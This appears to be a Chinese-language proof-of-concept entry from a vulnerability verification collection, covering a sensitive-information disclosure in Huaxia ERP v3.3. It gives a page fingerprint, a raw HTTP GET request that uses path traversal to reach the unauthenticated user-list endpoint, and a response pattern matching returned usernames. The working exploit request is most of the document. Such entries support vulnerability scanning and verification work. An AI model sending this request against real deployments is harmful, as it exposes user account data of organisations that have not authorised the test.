﻿# 华夏erp v3.3 后台系统敏感信息泄露漏洞

> 更新时间：2024-02-26

> 漏洞编号：

> 漏洞说明：华夏erp v3.3 存在后台系统敏感信息泄露漏洞

> 漏洞特征：body="华夏ERP"

> 验证脚本：HTTP

```
GET /user/login/../../jshERP-boot/user/getAllList HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?200)(?=.*?username).*?$

> 上传文件定位：

> 验证文件来源：华夏erp v3.3 后台系统敏感信息泄露漏洞.poc